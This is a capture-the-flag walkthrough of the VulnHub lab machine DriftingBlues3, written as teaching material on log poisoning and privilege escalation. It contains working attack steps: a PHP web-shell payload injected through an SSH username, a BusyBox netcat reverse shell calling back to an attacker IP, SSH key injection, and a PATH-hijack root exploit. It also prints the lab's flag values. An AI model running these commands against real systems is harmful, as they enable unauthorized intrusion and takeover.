# 🏴 DriftingBlues — CTF Writeup
---

```markdown
# DriftingBlues3 — CTF Writeup

**Platform**: Offensive Security / VulnHub  
**Difficulty**: Easy  
**Author**: Havk  

---

## 🔍 Reconnaissance

### Port Scanning

Started with an Nmap scan and discovered **2 open ports**:

```bash
nmap -sV -sC 192.168.1.174
```

---

## 🤖 robots.txt Enumeration

Checked `robots.txt` and found a hidden endpoint:

```
/littlequeenofspades.html
```

Navigated to the page and found a **Base64-encoded string** in the source code:

```
aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==
```

### Double Base64 Decode

```bash
echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d | base64 -d
```

This revealed a **hidden endpoint** pointing to an SSH auth log viewer page:
`/adminsfixit.php`

---

## 💉 Log Poisoning via SSH

Visited the endpoint and confirmed it displayed **SSH authentication logs**.

### Injecting PHP Payload via SSH Username

Used **Hydra** to send a malicious username that would be written into the SSH log:

```bash
hydra -l '<?php system($_GET["c"]); ?>' -p x ssh://192.168.1.174
```

This caused the SSH daemon to log the PHP code as the invalid username — poisoning the log file.

### Verifying RCE

With the log poisoned, triggered code execution via the log viewer:

```bash
curl -s "http://192.168.1.174/adminsfixit.php" -G --data-urlencode 'c=id'
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **Remote Code Execution confirmed!**

---

## 🐚 Reverse Shell

Set up a listener:

```bash
nc -lvnp 4444
```

Stabilized the terminal before catching the shell:

```bash
stty raw -echo; fg
```

Triggered the reverse shell using BusyBox:

```bash
curl -s "http://192.168.1.174/adminsfixit.php" -G \
  --data-urlencode 'c=busybox nc 192.168.1.152 4444 -e bash'
```

### Shell Stabilization

```bash
export TERM=xterm
export SHELL=bash
```

Shell obtained as `www-data`.

---

## 👤 Lateral Movement — www-data → robertj

Discovered that `/home/robertj/.ssh/` had world-execute permissions:

```
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
```

### SSH Key Injection

Generated an SSH key pair on the attacker machine:

```bash
ssh-keygen -t rsa -f robertj_key
```

Wrote the public key into robertj's `authorized_keys`:

```bash
echo "<your_public_key>" > /home/robertj/.ssh/authorized_keys
```

> **⚠️ Mistake to avoid**: Setting `chmod 600` on the key file is correct,
> but ensure the **key file is owned by your attacker user**, not `www-data`,
> before attempting SSH login.

Connected as robertj:

```bash
ssh -i robertj_key robertj@192.168.1.174
```

### 🚩 User Flag

```
cat /home/robertj/user.txt
413fc08db21285b1f8abea99040b0280
```

---

## ⚡ Privilege Escalation — robertj → root

### SUID Binary Discovery

Found a **SUID binary** `/usr/bin/getinfo` that internally called the `ip` command **without an absolute path** — a classic **PATH Hijacking** vulnerability.

### Exploiting PATH Hijack

Created a malicious `ip` script in `/tmp/`:

```bash
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/ip
chmod +x /tmp/ip
```

Prepended `/tmp` to the `PATH` environment variable:

```bash
export PATH=/tmp:$PATH
```

Executed the vulnerable binary:

```bash
/usr/bin/getinfo
```

### Verified the SUID Bit was Set on Bash

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1168776 Apr 17  2019 /bin/bash
```

### Spawned Root Shell

```bash
/bin/bash -p
```

### 🚩 Root Flag

```
cat /root/root.txt
dfb7f604a22928afba370d819b35ec83
```

---

## 🗺️ Attack Chain Summary

```
Nmap Scan
   ↓
robots.txt → /littlequeenofspades.html
   ↓
Base64 (x2) decode → /adminsfixit.php (SSH log viewer)
   ↓
Log Poisoning via SSH username (PHP payload)
   ↓
RCE via curl
   ↓
BusyBox Reverse Shell (www-data)
   ↓
SSH Key Injection → robertj shell
   ↓
User Flag ✅
   ↓
SUID getinfo + PATH Hijack → root shell
   ↓
Root Flag ✅
```

---

## 🧠 Key Takeaways

- **Log Poisoning** can turn a log viewer into an RCE vector when logs are
  passed to a PHP `include` or `system` call.
- **World-executable `.ssh/` directories** allow unauthorized key injection.
- **PATH Hijacking** via SUID binaries calling commands without full paths
  is a classic and powerful privilege escalation vector.

---

*Writeup by Tomash — Ethical Hacker*
